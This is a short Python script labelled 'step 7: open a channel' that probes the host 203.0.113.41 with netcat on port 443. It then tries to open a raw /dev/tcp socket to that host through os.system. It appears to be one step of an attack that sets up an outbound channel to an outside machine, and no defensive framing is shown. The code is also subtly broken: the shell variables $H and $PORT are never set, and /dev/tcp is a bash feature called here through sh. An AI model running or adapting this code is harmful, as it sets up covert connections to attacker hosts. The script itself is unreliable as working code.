#!/usr/bin/env python3
# step 7: open a channel
import os
import subprocess

H = "203.0.113.41"
subprocess.run(["sh", "-c", "nc -zv 203.0.113.41 443"])
os.system("exec 3<>/dev/tcp/$H/$PORT")
